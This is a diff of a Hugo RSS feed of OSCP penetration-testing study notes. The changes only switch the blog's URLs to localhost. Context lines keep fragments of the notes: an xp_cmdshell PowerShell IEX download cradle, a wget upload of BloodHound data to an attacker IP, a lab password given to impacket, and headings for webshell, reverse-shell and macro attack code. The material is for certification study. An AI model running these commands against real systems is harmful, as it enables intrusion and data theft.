@@ -2,22 +2,22 @@
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
   <channel>
     <title>OSCP笔记 on 养猪日记</title>
-    <link>https://yangzhuzai.github.io/categories/oscp%E7%AC%94%E8%AE%B0/</link>
+    <link>http://localhost:1313/categories/oscp%E7%AC%94%E8%AE%B0/</link>
     <description>Recent content in OSCP笔记 on 养猪日记</description>
     <image>
       <title>养猪日记</title>
-      <url>https://yangzhuzai.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E</url>
-      <link>https://yangzhuzai.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E</link>
+      <url>http://localhost:1313/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E</url>
+      <link>http://localhost:1313/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E</link>
     </image>
     <generator>Hugo -- 0.135.0</generator>
     <language>en</language>
     <lastBuildDate>Fri, 11 Oct 2024 14:25:59 +0800</lastBuildDate>
-    <atom:link href="https://yangzhuzai.github.io/categories/oscp%E7%AC%94%E8%AE%B0/index.xml" rel="self" type="application/rss+xml" />
+    <atom:link href="http://localhost:1313/categories/oscp%E7%AC%94%E8%AE%B0/index.xml" rel="self" type="application/rss+xml" />
     <item>
       <title>kali 环境爬坑</title>
-      <link>https://yangzhuzai.github.io/posts/oscp/kali-%E7%8E%AF%E5%A2%83%E7%88%AC%E5%9D%91/</link>
+      <link>http://localhost:1313/posts/oscp/kali-%E7%8E%AF%E5%A2%83%E7%88%AC%E5%9D%91/</link>
       <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
-      <guid>https://yangzhuzai.github.io/posts/oscp/kali-%E7%8E%AF%E5%A2%83%E7%88%AC%E5%9D%91/</guid>
+      <guid>http://localhost:1313/posts/oscp/kali-%E7%8E%AF%E5%A2%83%E7%88%AC%E5%9D%91/</guid>
       <description>&lt;p&gt;python2 安装pip问题：&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;wget https://bootstrap.pypa.io/pip/2.7/get-pip.py
 python2 get-pip.py
@@ -59,9 +59,9 @@ pip install pycryptodome
     </item>
     <item>
       <title>Linux 提权</title>
-      <link>https://yangzhuzai.github.io/posts/oscp/linux-%E6%8F%90%E6%9D%83/</link>
+      <link>http://localhost:1313/posts/oscp/linux-%E6%8F%90%E6%9D%83/</link>
       <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
-      <guid>https://yangzhuzai.github.io/posts/oscp/linux-%E6%8F%90%E6%9D%83/</guid>
+      <guid>http://localhost:1313/posts/oscp/linux-%E6%8F%90%E6%9D%83/</guid>
       <description>&lt;p&gt;添加路由：
 sudo route add -net 192.168.245.1 netmask 255.255.255.0 gw 192.168.45.254
 sudo route add -net &amp;lt;目标网络&amp;gt; netmask &amp;lt;掩码&amp;gt; gw &amp;lt;网关地址&amp;gt;&lt;/p&gt;
@@ -112,9 +112,9 @@ searchsploit &amp;#34;linux kernel Ubuntu 16 Local Privilege Escalation&amp;#34;
     </item>
     <item>
       <title>web渗透</title>
-      <link>https://yangzhuzai.github.io/posts/oscp/web%E6%B8%97%E9%80%8F/</link>
+      <link>http://localhost:1313/posts/oscp/web%E6%B8%97%E9%80%8F/</link>
       <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
-      <guid>https://yangzhuzai.github.io/posts/oscp/web%E6%B8%97%E9%80%8F/</guid>
+      <guid>http://localhost:1313/posts/oscp/web%E6%B8%97%E9%80%8F/</guid>
       <description>&lt;p&gt;靶场的关注重点相比实战会更为细节：&lt;/p&gt;
 &lt;p&gt;1、域名；
 2、网站技术架构cms等；
@@ -235,9 +235,9 @@ EXEC master.dbo.xp_cmdshell &amp;#34;powershell.exe -c IEX(New-Object System.Net
     </item>
     <item>
       <title>windows 提权</title>
-      <link>https://yangzhuzai.github.io/posts/oscp/windows-%E6%8F%90%E6%9D%83/</link>
+      <link>http://localhost:1313/posts/oscp/windows-%E6%8F%90%E6%9D%83/</link>
       <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
-      <guid>https://yangzhuzai.github.io/posts/oscp/windows-%E6%8F%90%E6%9D%83/</guid>
+      <guid>http://localhost:1313/posts/oscp/windows-%E6%8F%90%E6%9D%83/</guid>
       <description>&lt;p&gt;提权检查项目：注意细心！！！！！！！！！！一切异常情况&lt;/p&gt;
 &lt;p&gt;目前实验发现，备份文件、历史记录、内存密码、特殊程序都有可能，然后是密码复用，administrator&lt;/p&gt;
 &lt;p&gt;1、计划任务，配合手动可以查看下次运行时间
@@ -282,9 +282,9 @@ C:\Users\cxk\AppData\Roaming
     </item>
     <item>
       <title>反弹shell</title>
-      <link>https://yangzhuzai.github.io/posts/oscp/%E5%8F%8D%E5%BC%B9shell/</link>
+      <link>http://localhost:1313/posts/oscp/%E5%8F%8D%E5%BC%B9shell/</link>
       <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
-      <guid>https://yangzhuzai.github.io/posts/oscp/%E5%8F%8D%E5%BC%B9shell/</guid>
+      <guid>http://localhost:1313/posts/oscp/%E5%8F%8D%E5%BC%B9shell/</guid>
       <description>&lt;p&gt;&lt;a href=&#34;https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet?trk=article-ssr-frontend-pulse_little-text-block&#34;&gt;https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet?trk=article-ssr-frontend-pulse_little-text-block&lt;/a&gt;&lt;/p&gt;
 &lt;h2 id=&#34;php&#34;&gt;PHP:&lt;/h2&gt;
 &lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1、webshell代码：
@@ -463,9 +463,9 @@ C:\Users\cxk\AppData\Roaming
     </item>
     <item>
       <title>另类技巧</title>
-      <link>https://yangzhuzai.github.io/posts/oscp/%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7/</link>
+      <link>http://localhost:1313/posts/oscp/%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7/</link>
       <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
-      <guid>https://yangzhuzai.github.io/posts/oscp/%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7/</guid>
+      <guid>http://localhost:1313/posts/oscp/%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7/</guid>
       <description>&lt;p&gt;wget 批量下载文件：&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;#!/bin/bash
 
@@ -497,9 +497,9 @@ exiftool *.jpg | grep -i Author | cut -d &amp;#34;:&amp;#34; -f 2 | cut -d &amp;
     </item>
     <item>
       <title>域渗透思路总结</title>
-      <link>https://yangzhuzai.github.io/posts/oscp/%E5%9F%9F%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/</link>
+      <link>http://localhost:1313/posts/oscp/%E5%9F%9F%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/</link>
       <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
-      <guid>https://yangzhuzai.github.io/posts/oscp/%E5%9F%9F%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/</guid>
+      <guid>http://localhost:1313/posts/oscp/%E5%9F%9F%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/</guid>
       <description>&lt;h1 id=&#34;一获取立足身份凭证&#34;&gt;一、获取立足身份凭证&lt;/h1&gt;
 &lt;h2 id=&#34;1ldap匿名信息泄露&#34;&gt;1、LDAP匿名信息泄露：&lt;/h2&gt;
 &lt;p&gt;配合windapsearch.py获取域内用户信息：&lt;/p&gt;
@@ -535,9 +535,9 @@ exiftool *.jpg | grep -i Author | cut -d &amp;#34;:&amp;#34; -f 2 | cut -d &amp;
     </item>
     <item>
       <title>域渗透操作</title>
-      <link>https://yangzhuzai.github.io/posts/oscp/%E5%9F%9F%E6%B8%97%E9%80%8F%E6%93%8D%E4%BD%9C/</link>
+      <link>http://localhost:1313/posts/oscp/%E5%9F%9F%E6%B8%97%E9%80%8F%E6%93%8D%E4%BD%9C/</link>
       <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
-      <guid>https://yangzhuzai.github.io/posts/oscp/%E5%9F%9F%E6%B8%97%E9%80%8F%E6%93%8D%E4%BD%9C/</guid>
+      <guid>http://localhost:1313/posts/oscp/%E5%9F%9F%E6%B8%97%E9%80%8F%E6%93%8D%E4%BD%9C/</guid>
       <description>&lt;h1 id=&#34;impacket-lookupsid&#34;&gt;impacket-lookupsid&lt;/h1&gt;
 &lt;p&gt;可获取主机用户名：&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;impacket-lookupsid svc_apache:&amp;#39;S@Ss!K@*t13&amp;#39;@&amp;#39;flight.htb&amp;#39;
@@ -576,9 +576,9 @@ V2：HMAC-MD5加密算法&lt;/p&gt;
     </item>
     <item>
       <title>客户端攻击</title>
-      <link>https://yangzhuzai.github.io/posts/oscp/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%94%BB%E5%87%BB/</link>
+      <link>http://localhost:1313/posts/oscp/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%94%BB%E5%87%BB/</link>
       <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
-      <guid>https://yangzhuzai.github.io/posts/oscp/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%94%BB%E5%87%BB/</guid>
+      <guid>http://localhost:1313/posts/oscp/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%94%BB%E5%87%BB/</guid>
       <description>&lt;h1 id=&#34;宏&#34;&gt;宏&lt;/h1&gt;
 &lt;p&gt;后缀建议为doc或者docm&lt;/p&gt;
 &lt;p&gt;宏攻击代码：&lt;/p&gt;
@@ -620,9 +620,9 @@ for i in range(0, len(str), n):
     </item>
     <item>
       <title>常见服务</title>
-      <link>https://yangzhuzai.github.io/posts/oscp/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1/</link>
+      <link>http://localhost:1313/posts/oscp/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1/</link>
       <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
-      <guid>https://yangzhuzai.github.io/posts/oscp/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1/</guid>
+      <guid>http://localhost:1313/posts/oscp/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1/</guid>
       <description>&lt;p&gt;渗透主要遵循高危服务为先的策略，以下为打靶过程中的记录：&lt;/p&gt;
 &lt;h2 id=&#34;nfs&#34;&gt;NFS&lt;/h2&gt;
 &lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;挂载：
@@ -708,9 +708,9 @@ hydra -l you -P（此处p为大写，大小写此处代表的意义不同）+字
     </item>
     <item>
       <title>文件传输</title>
-      <link>https://yangzhuzai.github.io/posts/oscp/%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93/</link>
+      <link>http://localhost:1313/posts/oscp/%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93/</link>
       <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
-      <guid>https://yangzhuzai.github.io/posts/oscp/%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93/</guid>
+      <guid>http://localhost:1313/posts/oscp/%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93/</guid>
       <description>&lt;p&gt;1、kali web服务搭建&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;服务搭建： 
 python2:python2 -m SimpleHTTPServer 
@@ -766,9 +766,9 @@ wget --method=PUT --post-file=20240128065938_BloodHound.zip http://10.10.16.4/
     </item>
     <item>
       <title>端口扫描</title>
-      <link>https://yangzhuzai.github.io/posts/oscp/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/</link>
+      <link>http://localhost:1313/posts/oscp/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/</link>
       <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
-      <guid>https://yangzhuzai.github.io/posts/oscp/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/</guid>
+      <guid>http://localhost:1313/posts/oscp/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/</guid>
       <description>&lt;p&gt;直连网络使用nmap进行扫描，非直连网络，先用Rustscan快速探测端口开放性，然后再搭建ligolo进行针对端口扫描，速度可以调到400-1000左右，测试顺利；&lt;/p&gt;
 &lt;h2 id=&#34;列出存活主机&#34;&gt;列出存活主机：&lt;/h2&gt;
 &lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;nmap:
@@ -898,9 +898,9 @@ masscan.exe -p1-10000 172.16.234.0/24 --rate=5000 -oB scan.txt
     </item>
     <item>
       <title>隐藏信息获取&amp;破解</title>
-      <link>https://yangzhuzai.github.io/posts/oscp/%E9%9A%90%E8%97%8F%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%E7%A0%B4%E8%A7%A3/</link>
+      <link>http://localhost:1313/posts/oscp/%E9%9A%90%E8%97%8F%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%E7%A0%B4%E8%A7%A3/</link>
       <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
-      <guid>https://yangzhuzai.github.io/posts/oscp/%E9%9A%90%E8%97%8F%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%E7%A0%B4%E8%A7%A3/</guid>
+      <guid>http://localhost:1313/posts/oscp/%E9%9A%90%E8%97%8F%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%E7%A0%B4%E8%A7%A3/</guid>
       <description>&lt;p&gt;secret&lt;/p&gt;
 &lt;h2 id=&#34;图片信息查看&#34;&gt;图片信息查看：&lt;/h2&gt;
 &lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;exiftool 查看图片基本信息 
@@ -1035,9 +1035,9 @@ xdg-open xx.eml
     </item>
     <item>
       <title>隧道代理</title>
-      <link>https://yangzhuzai.github.io/posts/oscp/%E9%9A%A7%E9%81%93%E4%BB%A3%E7%90%86/</link>
+      <link>http://localhost:1313/posts/oscp/%E9%9A%A7%E9%81%93%E4%BB%A3%E7%90%86/</link>
       <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
-      <guid>https://yangzhuzai.github.io/posts/oscp/%E9%9A%A7%E9%81%93%E4%BB%A3%E7%90%86/</guid>
+      <guid>http://localhost:1313/posts/oscp/%E9%9A%A7%E9%81%93%E4%BB%A3%E7%90%86/</guid>
       <description>&lt;h1 id=&#34;linux&#34;&gt;Linux&lt;/h1&gt;
 &lt;h2 id=&#34;ssh&#34;&gt;SSH&lt;/h2&gt;
 &lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;-g：开启网关，使同一个局域网内的设备都可以访问。不然只有kali的IP才能访问。 
@@ -1078,7 +1078,7 @@ socks隧道，kali的9998即代表远程主机的
 &lt;p&gt;DMZ第一台主机已经拿下，有第二台主机的ssh账密，一二之间通过ssh隧道通信，访问一的445可以访问到第三台的445端口&lt;/p&gt;
 &lt;p&gt;命令：&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;ssh -N -L 0.0.0.0:4455:172.16.50.217:445 database_admin@10.4.50.215
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/oscp_img/Pasted%20image%2020240314213959.png&#34; alt=&#34;&#34;  /&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;http://localhost:1313/oscp_img/Pasted%20image%2020240314213959.png&#34; alt=&#34;&#34;  /&gt;
 &lt;/p&gt;</description>
     </item>
   </channel>
